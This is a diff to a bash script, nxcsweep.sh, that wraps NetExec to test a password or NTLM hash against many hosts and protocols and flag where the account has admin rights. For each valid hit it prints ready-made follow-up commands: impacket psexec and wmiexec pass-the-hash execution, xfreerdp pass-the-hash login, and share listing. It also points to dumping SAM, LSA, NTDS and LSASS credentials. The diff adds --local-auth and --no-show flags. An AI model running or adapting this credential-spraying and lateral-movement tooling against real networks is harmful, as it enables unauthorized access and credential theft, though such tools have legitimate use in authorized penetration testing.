@@ -6,18 +6,21 @@
 # NetExec (nxc).
 #
 # Usage (matches nxc's own flag style):
-#   ./nxcsweep.sh <target> -u <username> -p <password>
-#   ./nxcsweep.sh <target> -u <username> -H <ntlm_hash>
+#   ./nxcsweep.sh <target> -u <username> -p <password> [--local-auth] [--no-show]
+#   ./nxcsweep.sh <target> -u <username> -H <ntlm_hash> [--local-auth] [--no-show]
 #
 # Examples:
 #   ./nxcsweep.sh 10.10.10.5 -u administrator -p 'P@ssw0rd!'
 #   ./nxcsweep.sh 10.10.10.0/24 -u j.doe -p 'Summer2024!'
-#   ./nxcsweep.sh 10.10.10.5 -u administrator -H <hash>
+#   ./nxcsweep.sh 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+#   ./nxcsweep.sh 10.10.10.5 -u Administrator -p 'P@ssw0rd!' --local-auth   # local (non-domain) account
+#   ./nxcsweep.sh 10.10.10.0/24 -u j.doe -p 'Summer2024!' --no-show        # just the pass/fail status, no connect-command block
 #
 # Requires: netexec (nxc) - https://github.com/Pennyw0rth/NetExec
 
 set -euo pipefail
 
+# ---- colors ----
 GREEN='\033[0;32m'
 RED='\033[0;31m'
 YELLOW='\033[1;33m'
@@ -26,20 +29,41 @@ GREY='\033[0;37m'
 NC='\033[0m'
 
 usage() {
-    echo -e "${YELLOW}Usage:${NC} $0 <target_ip_or_cidr> -u <username> -p <password>"
-    echo -e "       $0 <target_ip_or_cidr> -u <username> -H <ntlm_hash>"
+    echo -e "${YELLOW}Usage:${NC} $0 <target_ip_or_cidr> -u <username> -p <password> [--local-auth] [--no-show]"
+    echo -e "       $0 <target_ip_or_cidr> -u <username> -H <ntlm_hash> [--local-auth] [--no-show]"
     echo -e ""
     echo -e "  e.g. $0 10.10.10.0/24 -u administrator -p 'Password123!'"
     echo -e "  e.g. $0 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+    echo -e "  e.g. $0 10.10.10.5 -u Administrator -p 'P@ssw0rd!' --local-auth"
+    echo -e "  e.g. $0 10.10.10.0/24 -u j.doe -p 'Summer2024!' --no-show"
+    echo -e ""
+    echo -e "  --local-auth   authenticate as a local account instead of a domain one (passed straight to nxc)"
+    echo -e "  --no-show      only print pass/fail status per protocol - skip the connect-command suggestions block"
     exit 1
 }
 
-if [ "$#" -lt 5 ]; then
+# ---- args ----
+if [ "$#" -lt 1 ]; then
     usage
 fi
 
 TARGET="$1"
 shift
+
+# pre-scan for boolean long-flags anywhere in the remaining args, then hand
+# whatever's left to getopts for the -u/-p/-H short flags (getopts alone
+# can't parse long options like --local-auth)
+LOCAL_AUTH=false
+NO_SHOW=false
+REMAINING_ARGS=()
+for arg in "$@"; do
+    case "$arg" in
+        --local-auth) LOCAL_AUTH=true ;;
+        --no-show) NO_SHOW=true ;;
+        *) REMAINING_ARGS+=("$arg") ;;
+    esac
+done
+set -- "${REMAINING_ARGS[@]}"
 
 USERNAME=""
 SECRET=""
@@ -58,6 +82,7 @@ if [ -z "$USERNAME" ] || [ -z "$SECRET" ] || [ -z "$MODE" ]; then
     usage
 fi
 
+# ---- check nxc is installed ----
 if ! command -v nxc &> /dev/null; then
     echo -e "${RED}[!] netexec (nxc) not found in PATH. Install it first: pip install netexec${NC}"
     exit 1
@@ -75,7 +100,17 @@ if [ "$MODE" = "hash" ]; then
 else
     echo -e "Password : ${YELLOW}${SECRET}${NC}"
 fi
+if [ "$LOCAL_AUTH" = true ]; then
+    echo -e "Auth type: ${YELLOW}local${NC}"
+fi
 echo ""
+
+# reused later to keep the suggested nxc follow-up commands (--shares, -x whoami)
+# consistent with how the sweep itself authenticated
+LOCAL_AUTH_SUFFIX=""
+if [ "$LOCAL_AUTH" = true ]; then
+    LOCAL_AUTH_SUFFIX=" --local-auth"
+fi
 
 # deduplicated hit tracking: key = "proto|ip", value = "yes"/"no" (Pwn3d status)
 # HIT_ORDER preserves first-seen order so output stays grouped sensibly
@@ -85,32 +120,30 @@ declare -a HIT_ORDER=()
 for proto in "${PROTOCOLS[@]}"; do
     echo -e "${CYAN}[*] Checking protocol: ${proto^^}${NC}"
 
-    # Run nxc through a pseudo-tty (via `script`) so it emits its own native
-    # multi-color output instead of stripping colors because it's not attached
-    # to a real terminal when captured into a variable.
-    esc_target=$(printf '%q' "$TARGET")
-    esc_user=$(printf '%q' "$USERNAME")
-    esc_secret=$(printf '%q' "$SECRET")
+    NXC_ARGS=("$proto" "$TARGET" -u "$USERNAME")
     if [ "$MODE" = "hash" ]; then
-        NXC_CMD="nxc $proto $esc_target -u $esc_user -H $esc_secret"
+        NXC_ARGS+=(-H "$SECRET")
     else
-        NXC_CMD="nxc $proto $esc_target -u $esc_user -p $esc_secret"
+        NXC_ARGS+=(-p "$SECRET")
+    fi
+    if [ "$LOCAL_AUTH" = true ]; then
+        NXC_ARGS+=(--local-auth)
     fi
 
     if command -v script &> /dev/null; then
-        OUTPUT=$(script -qec "$NXC_CMD" /dev/null 2>&1 || true)
+        esc_cmd="nxc"
+        for a in "${NXC_ARGS[@]}"; do
+            esc_cmd="$esc_cmd $(printf '%q' "$a")"
+        done
+        OUTPUT=$(script -qec "$esc_cmd" /dev/null 2>&1 || true)
     else
-        if [ "$MODE" = "hash" ]; then
-            OUTPUT=$(nxc "$proto" "$TARGET" -u "$USERNAME" -H "$SECRET" 2>&1 || true)
-        else
-            OUTPUT=$(nxc "$proto" "$TARGET" -u "$USERNAME" -p "$SECRET" 2>&1 || true)
-        fi
+        OUTPUT=$(nxc "${NXC_ARGS[@]}" 2>&1 || true)
     fi
 
-
+    # color-free copy used only for our own [+]/Pwn3d! parsing logic below
     PLAIN=$(echo "$OUTPUT" | sed -r 's/\x1b\[[0-9;]*[a-zA-Z]//g')
 
-
+    # Highlight based on nxc's typical output markers
     if echo "$PLAIN" | grep -qi "(Pwn3d!)"; then
         echo -e "${GREEN}[+] $proto: Admin access confirmed (Pwn3d!)${NC}"
     elif echo "$PLAIN" | grep -qi "\[+\]"; then
@@ -134,6 +167,7 @@ for proto in "${PROTOCOLS[@]}"; do
         else
             pwn="no"
         fi
+
         if [ -z "${HITMAP[$key]:-}" ]; then
             HITMAP["$key"]="$pwn"
             HIT_ORDER+=("$key")
@@ -143,7 +177,9 @@ for proto in "${PROTOCOLS[@]}"; do
     done < <(echo "$PLAIN" | grep -i "\[+\]")
 done
 
-if [ "${#HIT_ORDER[@]}" -gt 0 ]; then
+if [ "$NO_SHOW" = true ]; then
+    :
+elif [ "${#HIT_ORDER[@]}" -gt 0 ]; then
     echo ""
     echo -e "${CYAN}=========================================${NC}"
     echo -e "${CYAN} Valid credential hits - connect commands${NC}"
@@ -171,32 +207,31 @@ if [ "${#HIT_ORDER[@]}" -gt 0 ]; then
                     if [ "$MODE" = "hash" ]; then
                         echo -e "    ${GREY}impacket-psexec -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
                         echo -e "    ${GREY}impacket-wmiexec -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
-                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' -x whoami${NC}"
+                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' -x whoami${LOCAL_AUTH_SUFFIX}${NC}"
                     else
                         echo -e "    ${GREY}impacket-psexec '${USERNAME}:${SECRET}@${hip}'${NC}"
                         echo -e "    ${GREY}impacket-wmiexec '${USERNAME}:${SECRET}@${hip}'${NC}"
-                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' -x whoami${NC}"
+                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' -x whoami${LOCAL_AUTH_SUFFIX}${NC}"
                     fi
                     echo ""
                     echo -e "    ${CYAN}You can dump credentials as well using nxc modules (--sam, --lsa, --ntds, -M lsassy, -M dpapi)${NC}"
                 else
                     echo -e "${GREEN}[+] SMB valid (non-admin) on ${hip}${NC}"
                     if [ "$MODE" = "hash" ]; then
-                        # standard smbclient can't pass-the-hash; impacket's smbclient.py can
                         echo -e "    ${GREY}impacket-smbclient -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
-                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' --shares${NC}"
+                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' --shares${LOCAL_AUTH_SUFFIX}${NC}"
                     else
                         echo -e "    ${GREY}smbclient -L //${hip}/ -U '${USERNAME}%${SECRET}'${NC}"
-                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' --shares${NC}"
+                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' --shares${LOCAL_AUTH_SUFFIX}${NC}"
                     fi
                 fi
                 ;;
             rdp)
                 echo -e "${GREEN}[+] RDP valid on ${hip}${NC}"
                 if [ "$MODE" = "hash" ]; then
-                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /pth:${SECRET} +dynamic-resolution /drive:privtools,/home/offo/windowspriv/tools${NC}"
+                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /pth:${SECRET} +dynamic-resolution${NC}"
                 else
-                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /p:'${SECRET}' +dynamic-resolution /drive:privtools,/home/offo/windowspriv/tools${NC}"
+                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /p:'${SECRET}' +dynamic-resolution${NC}"
                 fi
                 ;;
             wmi)
